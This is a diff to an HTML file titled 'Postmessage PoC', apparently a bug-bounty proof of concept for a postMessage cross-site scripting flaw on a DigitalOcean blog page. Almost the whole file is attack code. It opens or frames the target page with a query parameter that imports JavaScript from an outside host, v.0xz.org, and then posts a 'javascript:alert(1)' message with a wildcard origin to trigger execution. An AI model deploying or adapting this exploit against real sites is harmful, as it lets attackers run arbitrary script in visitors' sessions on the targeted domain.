@@ -1,6 +1,27 @@
-<!DOCTYPE html>
+
+<!doctype html>
 <html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>Postmessage PoC</title>
+        <script>
+            function pocLink() {
+                let win = window.open('https://www.digitalocean.com/blog/new-product-updates-kafka-and-more?xs=import(%27https://v.0xz.org/eric0xdzez9.js%27)#ce-cta-_Bo9opgk6oJMOWHQ8tLN9ah4xp--RcJ1_-auSCYcxN4.6292ee74-fd70-469a-be51-238a29b65783');
+                let msg = "highlightJsExecutejavascript:alert(1)7-";
+                
+                setTimeout(function(){
+                    win.postMessage(msg, '*');
+                }, 5000);
+            }
+            function pocFrame(win) {           
+                let msg = "highlightJsExecutejavascript:alert(1)7-";
+                
+                win.postMessage(msg, '*');          
+            }
+        </script>
+    </head>
     <body>
-        <iframe src="https://cloud.digitalocean.com/login" width="100" height="100"></iframe>
+        <a href="#" onclick="pocLink();">PoC link</a>          
+        <iframe src="https://www.digitalocean.com/blog/new-product-updates-kafka-and-more?xs=import(%27https://v.0xz.org/eric0xdzez9.js%27)#ce-cta-_Bo9opgk6oJMOWHQ8tLN9ah4xp--RcJ1_-auSCYcxN4.6292ee74-fd70-469a-be51-238a29b65783" onload="pocFrame(this.contentWindow)"></iframe>                    
     </body>
 </html>
